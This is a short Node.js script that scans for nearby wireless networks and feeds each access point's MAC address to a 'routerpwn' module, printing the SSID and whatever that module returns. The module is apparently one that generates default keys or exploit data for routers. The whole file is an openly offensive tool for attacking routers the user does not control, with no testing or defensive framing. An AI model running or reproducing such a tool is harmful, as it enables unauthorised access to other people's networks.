var routerpwn = require('routerpwn');
var iface = process.argv[2];

if (!iface) {
    console.log("Usage: " + process.argv[1] + " WIRELESS_INTERFACE");
    return;
}

var Wireless = require('wireless');
var wireless = new Wireless({
    iface: iface,
    updateFrequency: 5,
    connectionSpyFrequency: 2,
    vanishThreshold: 2
});


routerpwn.init(function() {
    wireless.enable(function(err) {
        wireless.start();

    	if(err) {
    		console.log(err);
    	}
    });
});

wireless.on('appear', function(networkList) {
    var pwn = routerpwn.pwn(networkList.address);

    if(pwn) {
        console.log(networkList.ssid);
        console.log(pwn);
    }
});
